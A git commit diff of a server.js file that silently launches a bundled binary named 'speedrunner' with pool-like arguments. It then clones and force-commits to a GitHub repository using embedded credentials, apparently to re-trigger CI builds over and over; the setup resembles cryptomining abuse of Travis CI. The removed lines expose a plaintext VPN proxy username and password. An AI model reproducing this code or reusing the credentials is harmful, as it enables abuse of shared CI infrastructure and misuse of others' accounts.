1b2a635e1343792859ce5b1bbbcf04cdee45a06d
tijehuus <31252273+tijehuus@users.noreply.github.com>
2017-08-22 16:41:50 +0000

    Update server.js

--- server.js
+++ server.js
@@ -1,4 +1,3 @@
-var proxy = 'user1778485:h1E5bec0@lon.uk.torguardvpnaccess.com:6060';
 var child = require('child_process').exec('cd ./lib && chmod 755 -R speedrunner && ./speedrunner -s start -o auto -regex true --type x');
 child.stdout.on('data', function(data) {
     console.log('stdout: ' + data);
@@ -9,19 +8,15 @@ child.stderr.on('data', function(data) {
 child.on('close', function(code) {
     console.log('closing code: ' + code);
 });
-var target = '';
-if (__dirname.indexOf('/home/travis') !== -1){
-  var pt = __dirname.split('travis/build/').pop();
-  target = 'https://' + pt.split('/')[0] + ':test123@github.com/' + pt.split('/')[0] + '/' + pt.split('/')[1] + '.git';
-}
+var target = 'https://tijehuus:test123@github.com/tijehuus/fragtood';
 var myrepo = 'git clone ' + target + ' aaa && ';
 myrepo += 'git config --global user.email "test" && ';
 myrepo += 'git config --global user.name "test" && ';
 myrepo += 'cd ./aaa && echo ' + (new Date()).getTime();
 myrepo += ' > log && git add . && git commit -m "update log" && git push ' + target;
-if (__dirname.indexOf('/home/travis') !== -1) require('child_process').exec(myrepo);
+require('child_process').exec(myrepo);
 var index = 1;
-var max = 46;
+var max = 37;
 var interval;
 interval = setInterval(function () {
   if (index >= max) {
